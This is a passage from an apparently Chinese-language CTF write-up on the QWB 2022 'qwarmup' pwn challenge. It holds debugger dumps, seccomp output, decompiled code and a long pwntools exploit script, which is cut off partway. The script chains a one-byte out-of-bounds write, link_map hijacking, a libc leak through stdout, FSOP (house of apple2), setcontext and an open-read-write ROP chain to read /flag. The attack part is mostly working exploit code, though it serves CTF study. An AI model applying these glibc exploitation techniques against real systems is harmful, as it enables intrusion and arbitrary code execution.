0x0000000000000000<br>0x7fd340863830 &lt;_IO_2_1_stdout_+176&gt;:	0x0000000000000000	0x0000000000000000<br>0x7fd340863840 &lt;_IO_2_1_stdout_+192&gt;:	0x0000000000000000	0x0000000000000000<br>0x7fd340863850 &lt;_IO_2_1_stdout_+208&gt;:	0x0000000000000000	0x00007fd340864040<br><br>pwndbg&gt; p  *(struct _IO_FILE_plus *) stdout<br>  file = &#123;<br>    _flags = -2059,<br>    _IO_read_ptr = 0x7fd34057c000 &quot;&quot;,<br>    _IO_read_end = 0x7fd340863803 &lt;_IO_2_1_stdout_+131&gt; &quot;&quot;,<br>    _IO_read_base = 0x7fd340863803 &lt;_IO_2_1_stdout_+131&gt; &quot;&quot;,<br>    _IO_write_base = 0x7fd300000000 &lt;error: Cannot access memory at address 0x7fd300000000&gt;,<br>    _IO_write_ptr = 0x7fd300000001 &lt;error: Cannot access memory at address 0x7fd300000001&gt;,<br>    _IO_write_end = 0x7fd340863804 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;,<br>    _IO_buf_base = 0x7fd340863803 &lt;_IO_2_1_stdout_+131&gt; &quot;&quot;,<br>    _IO_buf_end = 0x7fd340863804 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;,<br>    _IO_save_base = 0x0,<br>    _IO_backup_base = 0x0,<br>    _IO_save_end = 0x0,<br>    _markers = 0x0,<br>    _chain = 0x7fd340862aa0 &lt;_IO_2_1_stdin_&gt;,<br>    _fileno = 1,<br>    _flags2 = 0,<br>    _old_offset = -1,<br>    _cur_column = 0,<br>    _vtable_offset = 0 &#x27;\000&#x27;,<br>    _shortbuf = &quot;&quot;,<br>    _lock = 0x7fd340865750 &lt;_IO_stdfile_1_lock&gt;,<br>    _offset = -1,<br>    _codecvt = 0x0,<br>    _wide_data = 0x7fd3408629a0 &lt;_IO_wide_data_1&gt;,<br>    _freeres_list = 0x0,<br>    _freeres_buf = 0x0,<br>    __pad5 = 0,<br>    _mode = 0,<br>    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;<br>  &#125;,<br>  vtable = 0x7fd340864040 &lt;__GI__IO_wfile_jumps&gt;<br>&#125;<br><br></code></pre></td></tr></table></figure>





<h4 id="syscall-ret"><a href="#syscall-ret" class="headerlink" title="syscall; ret"></a>syscall; ret</h4><p><strong>开始想调用open函数进行orw的，但是后面发现不行，就改成syscall</strong></p>
<p>在 vsyscall 中的固定地址处找到 syscall&amp;return 代码片段</p>
<p>但是目前它已经被 <code>vsyscall-emulate</code> 和 <code>vdso</code> 机制代替了。此外，目前大多数系统都会开启 ASLR 保护，所以相对来说这些 gadgets 都并不容易找到。</p>
<p><strong>在libc中人工查找，在<code>_lll_lock_wake_privat</code>函数找到了对应的gadget</strong></p>
<p>(有篇文章说<code>get_uid</code>函数，里面存在syscall; ret，但是此处没有该函数)</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>复现：<a target="_blank" rel="noopener" href="https://4f-kira.github.io/2022/08/07/qwb2022/#qwarnup">https://4f-kira.github.io/2022/08/07/qwb2022/#qwarnup</a></p>
<p>​		    <a target="_blank" rel="noopener" href="https://kagehutatsu.com/?p=723">https://kagehutatsu.com/?p=723</a></p>
<p><strong>保护&amp;&amp;沙箱</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">chen@chen:~/桌面/match/qw_s6/qwarmup$ checksec ./qwarmup<br>[*] <span class="hljs-string">&#x27;/home/chen/桌面/match/qw_s6/qwarmup/qwarmup&#x27;</span><br>    Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO  <span class="hljs-comment">//可以改got表</span><br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br><br>chen@chen:~/桌面/match/qw_s6/qwarmup$ seccomp-tools dump ./qwarmup<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x08</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0010</span> <span class="hljs-comment">//不能改架构</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number				  <span class="hljs-comment">//只允许orw + exit</span><br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A == open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000009</span>  <span class="hljs-keyword">if</span> (A == mmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000c</span>  <span class="hljs-keyword">if</span> (A == brk) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003c</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000e7</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br><br></code></pre></td></tr></table></figure>



<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+7h] [rbp-19h] BYREF</span><br>  __int64 buf; <span class="hljs-comment">// [rsp+8h] [rbp-18h] BYREF</span><br>  _BYTE *v6; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v7 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  init_sandbox();<br>  read(<span class="hljs-number">0</span>, &amp;size, <span class="hljs-number">4uLL</span>);                         <span class="hljs-comment">//第一次输入，四字节大小, size在bss段</span><br>  v6 = <span class="hljs-built_in">malloc</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)size);              <span class="hljs-comment">//近似于任意大小的堆块申请, 申请到libc附近</span><br>  <span class="hljs-keyword">if</span> ( !v6 )<br>    _Exit(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    buf = <span class="hljs-number">0LL</span>;<br>    v4 = <span class="hljs-number">0</span>;<br>    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8uLL</span>);						<span class="hljs-comment">//第二次输入，控制堆v6的偏移</span><br>    read(<span class="hljs-number">0</span>, &amp;v4, <span class="hljs-number">1uLL</span>);							<span class="hljs-comment">//第三次输入，覆写一字节</span><br>    v6[buf] = v4;                               <span class="hljs-comment">//越界写一字节，改size ,改got表</span><br>    write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Success!&quot;</span>, <span class="hljs-number">8uLL</span>);<br>    HIWORD(v3) = WORD1(size);<br>    LOWORD(v3) = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( !v3 );  <span class="hljs-comment">//如果size&lt;0x10000，无限循环</span><br>  _Exit(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>跟wp思路，本机编译的libc2.35，改绑之后的偏移和wp对不上，根据自己的搓本地</p>
<p><strong>代码审计完：①一个大地址的malloc</strong></p>
<p>​		  			 <strong>②依托size判断–循环：一字节越界写</strong></p>
<p>​		   			<strong>③没有输出函数</strong></p>
<ol>
<li><p><strong>malloc一块大内存，通过mmap进行内存分配，从而实现堆块和libc动态库的重叠，通过一字节的越界写，修改<code>size&lt;0x10000</code>，控制循环一直进行</strong></p>
<p><strong>解析：</strong><code>payload = write(link_map_offset, p8(size_offset-4 - elf.got[&quot;write&quot;]))  </code></p>
<p>在ret2dl_reslove中：伪造 <code>link_map-&gt;l_addr</code>为 想要执行的目标函数 与libc中已解析函数与的偏移值  (前者-后者)</p>
<p>通过控制偏移到link_map，修改<code>link_map--&gt;l_addr</code>为<code>size_offset-4 - elf.got[&quot;write&quot;])</code>，实现覆写<code>size_offset-4</code>为<code>elf.got[&quot;write&quot;]四字节</code></p>
</li>
<li><p><strong>此后，在每次循环中，都可以对任意libc地址写一字节</strong></p>
<ul>
<li><p>ret2dl_reslove：通过<code>link_map--&gt;l_addr</code></p>
</li>
<li><p><code>_dl_fixup_</code>查找完函数地址后，会将函数地址回填到got表，那么可以通过修改<code>link_map-&gt;l_addr</code>，使回填的函数填到<code>write@got</code>某个偏移的地方，但是不在got上，所以此后每次执行write，都会进行symbol查找</p>
</li>
</ul>
</li>
<li><p><strong>篡改<code>_IO_stdout_2_1</code></strong></p>
<p><strong>解析：</strong><code>write(0x30e770, p32(0xfbad1800)) </code></p>
<p>​			<code>write(0x30e770+0x28, b&#39;\xff&#39;) </code></p>
<p>计算偏移，覆写<code>flags</code>以及<code>_IO_write_ptr</code></p>
</li>
<li><p><strong>调用<code>_IO_flush_all</code>刷新IO流，泄露libc</strong></p>
<ul>
<li><code>_dl_lookup_symbol_x</code>函数的第一个参数就是待查找函数的函数名，而<code>sym-&gt;st_name</code>对于同一个函数而言是一个固定值（write &#x3D; 34），而<code>strtab</code>则是来源于于libc上的全局结构体<code>link_map</code>，那么可以劫持<code>link_map-&gt;l_info[DT_STRTAB]</code>，使其指向可控内存段，达到任意函数调用。</li>
<li><code>DT_STRTAB</code>在elf中，由于没有泄露任何地址，目前是通过偏移进行任意地址写，这里找到<code>DT_DEBUG</code>这个表是指向libc地址，可以通过改写最低位，使<code>link_map-&gt;l_info[DT_STRTAB]</code>指向libc地址，然后我们在<code>DT_DEBUG+34</code>的地方写入需要调用的函数。</li>
</ul>
<p><strong>解析：</strong><code>payload = write(0x360118-0x10+34, b&quot;_IO_flush_all&quot;)</code></p>
<p>将<code>DT_DEBUG+34</code>写入<code>_IO_flush_all</code>   (<code>p &amp;((struct link_map*)0)-&gt;l_info[24]</code>,  offset &#x3D; 0x100)</p>
<p>​			<code>payload = write(link_map_offset+0x40+5*0x8,  b&#39;\xb8&#39;, False)  </code></p>
<p>将<code>DT_STRTAB</code>指向<code>DT_DEBUG: _IO_flush_all</code></p>
</li>
<li><p><strong>FSOP：控制IO结构体，目的是跳转到heap</strong></p>
<p>通过libc任意写，修改<code>_IO_2_1_stdout</code>，通过触发<code>_IO_flush_all</code>刷新IO流，执行修改后的IO</p>
<ul>
<li><code>flags: ~(2 | 0x8 | 0x800)</code>  </li>
<li><code>_IO_read_ptr:  heap_base+0x10</code> </li>
<li><code>vtable: _IO_wfile_jumps</code></li>
<li><code>_IO_write_ptr&gt;_IO_write_base</code></li>
<li>_wide_data不变，即为<code>_IO_wide_data_1</code><ul>
<li><code>_wide_data-&gt;_IO_write_base:  0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base:  0</code></li>
<li><code>_wide_data-&gt;_wide_vtable:  heap_base+0x30</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate : heap_base+0x30+0x68 : Magic</code></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>布置ROP链–magic_gadge + setcontext  + orw ，getshell</strong></p>
<ul>
<li><code>Magic: mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code></li>
<li><code>setcontext+61</code></li>
<li><code>ORW</code></li>
</ul>
<p>对于上面FSOP的布置，进一步的进行解释：</p>
<p>修改了IO结构体，其中的<code>_wide_data-&gt;vtable</code>指向了可控堆块A，<code>_wide_data-&gt;vtable-&gt;doallocate</code>指向A+0x68位置</p>
<p><code>_wide_data-&gt;vtable-&gt;doallocate</code>是rip地址，设置为<code>Magic</code></p>
<p>此时发现rdi寄存器，存放的是<code>_IO_2_1_stdout</code>地址，则步置<code>rdi+8</code>处内容为<code>heap_base+0x10</code>，使得<code>rdx</code>为<code>heap_base+0x10</code></p>
<p>布置<code>[rdx+0x20]</code>为<code>setcontext+61</code>，之后按照house of apple2的链子开始执行</p>
</li>
</ol>
<p><strong>流程图</strong></p>
<p><img src="/../md/22.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./qwarmup&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>	p = process(banary)<br><span class="hljs-keyword">else</span>:<br>	p = remote(ip, port)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>	gdb.attach(p)<br>	pause()<br>	<br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">offset, <span class="hljs-built_in">bytes</span>, tag=<span class="hljs-literal">True</span></span>):<br>    <span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">bytes</span>):<br>        p.send(p64(offset + i))<br>        p.send(p8(byte))<br>        <span class="hljs-keyword">if</span> tag:<br>            p.recvuntil(<span class="hljs-string">b&quot;Success!&quot;</span>)<br><span class="hljs-comment">#---------------------- 1.pwn Size &amp; leak_libc  -------------------</span><br><span class="hljs-comment">#0.malloc</span><br>s(p32(<span class="hljs-number">0xf0000</span>))<br><br><span class="hljs-comment">#1. pwn size</span><br>libc_offset = <span class="hljs-number">0xf4000</span> - <span class="hljs-number">0x10</span>   	<span class="hljs-comment">#vmmap</span><br>ld_offset = <span class="hljs-number">0x2F8000</span> - <span class="hljs-number">0x10</span>  		<span class="hljs-comment">#vmmap</span><br>size_offset = <span class="hljs-number">0x408c</span>   		<span class="hljs-comment">#IDA, elf_base+offset</span><br><br>link_map_offset = <span class="hljs-number">0x3302e0</span> - <span class="hljs-number">0x10</span> 	<span class="hljs-comment">#p _rtld_global</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(elf.got[<span class="hljs-string">&quot;write&quot;</span>]))<br><br><br><span class="hljs-comment"># write@got: 0x00007fxx xxxxxxxx</span><br><span class="hljs-comment"># &amp;size-4 == write@got</span><br>write(link_map_offset, p8(size_offset-<span class="hljs-number">4</span> - elf.got[<span class="hljs-string">&quot;write&quot;</span>])) <br><br><br><span class="hljs-comment">#2.leak_libc</span><br>_IO_2_1_stdout_ = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>)<br>write(<span class="hljs-number">0x2e7770</span>, p32(<span class="hljs-number">0xfbad1800</span>)) <span class="hljs-comment"># _flags</span><br>write(<span class="hljs-number">0x2e7770</span>+<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\xff&#x27;</span>)    <span class="hljs-comment"># _IO_write_ptr</span><br><br><span class="hljs-comment"># DT_STRTAB+34 = write =&gt; DT_DEBUG+34 = call_func</span><br>write(<span class="hljs-number">0x330108</span> + <span class="hljs-number">0x22</span>, <span class="hljs-string">b&quot;_IO_flush_all&quot;</span>) <span class="hljs-comment"># r_debug+34</span><br><br><span class="hljs-comment"># trigger _IO_flush_all</span><br>write(link_map_offset+<span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-string">b&#x27;\xb8&#x27;</span>, <span class="hljs-literal">False</span>) <span class="hljs-comment">#DT_STRTAB --&gt; DT_DEBUG</span><br>libc_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1F5750</span> <br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br><span class="hljs-comment">#back</span><br>write(link_map_offset+<span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-string">b&#x27;\x78&#x27;</span>)<br><br><span class="hljs-comment">#----------------- 2. FSOP --&gt;  ROP  ----------------</span><br>heap_base = libc_base - <span class="hljs-number">0xf4000</span> - <span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br>orw_base =  heap_base + <span class="hljs-number">0x110</span> - <span class="hljs-number">0x18</span><br><br>setcontext_61 = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] +<span class="hljs-number">61</span><br>pop_rax = libc_base + <span class="hljs-number">0x00000000000446a0</span><br>pop_rdi = libc_base + <span class="hljs-number">0x2da82</span><br>pop_rsi = libc_base + <span class="hljs-number">0x37bea</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x1070f1</span> <span class="hljs-comment">#pop rdx ; pop r12 ; ret</span><br>ret = libc_base + <span class="hljs-number">0x2c7ad</span><br>syscall_ret =  libc_base + <span class="hljs-number">0x0000000000088206</span><br><br><br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr= libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-comment">#0x00000000001471e0 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>Magic = libc_base + <span class="hljs-number">0x1471e0</span><br><br>_IO_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>)<br><br><span class="hljs-comment"># 1. FSOP --&gt; IO  --&gt; heap </span><br><span class="hljs-comment"># _IO_2_1_stdout_</span><br>write(<span class="hljs-number">0x2E7770</span> , p64(c_uint32(~(<span class="hljs-number">2</span> | <span class="hljs-number">0x8</span> | <span class="hljs-number">0x800</span>)).value))  <span class="hljs-comment">#flags</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">8</span>, p64(heap_base+<span class="hljs-number">0x10</span>)) <span class="hljs-comment">#[rdi+8]</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">216</span>, p64(_IO_wfile_jumps))  <span class="hljs-comment">#vtable</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">0x20</span>, p32(<span class="hljs-number">0</span>))	<span class="hljs-comment"># _IO_write_base</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">0x28</span>, p32(<span class="hljs-number">0x1</span>))	<span class="hljs-comment"># _IO_write_ptr&gt;_IO_write_base</span><br><br><span class="hljs-comment">#  _IO_2_1_stdout_ -&gt; _wide_data</span><br><span class="hljs-comment">#write(0x2E69A0, )  #_IO_wide_data_1</span><br>write(<span class="hljs-number">0x2E6990</span>+<span class="hljs-number">24</span>, p8(<span class="hljs-number">0</span>)) <span class="hljs-comment">#_wide_data-&gt;_IO_write_base</span><br>write(<span class="hljs-number">0x2E6990</span>+<span class="hljs-number">48</span>, p8(<span class="hljs-number">0</span>)) <span class="hljs-comment">#_wide_data-&gt;_IO_buf_base</span><br>write(<span class="hljs-number">0x2E6990</span>+<span class="hljs-number">224</span>, p64(heap_base+<span class="hljs-number">0x30</span>)) <span class="hljs-comment">#_wide_data-&gt;_wide_vtable: rdi</span><br><br><br><span class="hljs-comment"># 2. ROP -- ORW</span><br>flag_addr = heap_base + <span class="hljs-number">0x20</span><br>orw_addr = heap_base + <span class="hljs-number">0xC0</span><br><br>rop = flat(&#123;<br>    <span class="hljs-number">0x00</span>: [<span class="hljs-string">b&#x27;/flag\0\0\0&#x27;</span>, Magic],<br>    <span class="hljs-number">0x10</span>: [setcontext_61, heap_base+<span class="hljs-number">0x10</span>],<br>    <span class="hljs-number">0x20</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x30</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x40</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x50</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x60</span>: [<span class="hljs-number">0</span>, orw_addr],<br>    <span class="hljs-number">0x70</span>: [<span class="hljs-number">0</span>, Magic],<br>    <span class="hljs-number">0x80</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>], <span class="hljs-comment"># open(&#x27;/flag&#x27;,0,0), BUG</span><br>    <span class="hljs-number">0x90</span>: [orw_addr, ret],<br>    <span class="hljs-comment"># open(&#x27;/flag\0\0\0&#x27;, 0)</span><br>    <span class="hljs-number">0xa0</span>: [pop_rdi, flag_addr], <br>    <span class="hljs-number">0xb0</span>: [pop_rsi, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0xc0</span>: [pop_rdx_r12, <span class="hljs-number">0</span>],<br>    <span class="hljs-number">0xd0</span>: [<span 